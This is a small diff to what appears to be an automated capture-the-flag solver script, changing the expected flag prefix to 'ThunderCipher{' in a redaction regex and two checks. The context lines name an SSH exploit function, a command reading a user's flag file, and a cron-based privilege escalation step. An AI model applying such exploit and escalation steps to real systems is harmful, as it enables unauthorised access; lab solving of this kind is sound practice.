@@ -90,7 +90,7 @@ def tcp_open(host, port, timeout=3) -> bool:
 
 def flag_safe(value: str) -> str:
     """Replace flag content with [REDACTED] so it never appears in logs."""
-    return re.sub(r'(user|root)\{[^}]+\}', r'\1{[REDACTED]}', value)
+    return re.sub(r'(ThunderCipher|user|root)\{[^}]+\}', r'\1{[REDACTED]}', value)
 
 
 # ---------------------------------------------------------------------------
@@ -203,7 +203,7 @@ def sshole_exploit(host, ssh_port) -> SSHOLESession:
 def read_user_flag(client: SSHOLESession):
     _, stdout, _ = client.exec_command("cat /home/automation/user.txt", timeout=10)
     flag = stdout.read().decode().strip()
-    assert flag.startswith("user{"), \
+    assert flag.startswith("ThunderCipher{"), \
         f"user.txt doesn't look like a flag: {flag_safe(flag)}"
     assert len(flag) > 10, "user.txt is suspiciously short"
     # Print safe version only
@@ -243,7 +243,7 @@ def cron_privesc(client: SSHOLESession):
             f"cat {STAGING} 2>/dev/null", timeout=5
         )
         out = stdout.read().decode().strip()
-        if out.startswith("root{"):
+        if out.startswith("ThunderCipher{"):
             flag_content = out
             break
         time.sleep(5)
